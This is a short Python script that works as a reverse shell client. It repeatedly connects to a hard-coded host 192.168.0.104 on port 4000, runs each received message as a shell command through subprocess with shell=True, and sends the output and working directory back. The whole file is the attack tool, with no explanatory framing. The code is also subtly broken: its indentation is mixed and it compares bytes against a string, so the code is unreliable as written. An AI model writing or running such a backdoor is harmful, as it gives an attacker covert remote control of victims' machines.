import socket
import time
import subprocess
import os

LHOST = '192.168.0.104'
LPORT = 4000

def c(LHOST, LPORT):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((LHOST, LPORT))
		return(s)

	except Exception as e:
		print('Connection Error', e)
		return None

def listen(s):
	while True:
		msg = s.recv(1024)
		if msg[:-1] == '/exit':
			exit(0)
		else:				
			cmd(s, msg)

			

def cmd(s, msg):
	proc = subprocess.Popen(msg, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	saida = proc.stdout.read() + proc.stderr.read()
	output_str = str(saida, "UTF-8") # Format output.
    currentWD = os.getcwd() + "> " # Get current working directory.
    s.send(str.encode(currentWD + output_str))


def main():
	while True:
		connected = c(LHOST, LPORT)

		if connected:
			listen(connected)
		else:
			time.sleep(3)

main()
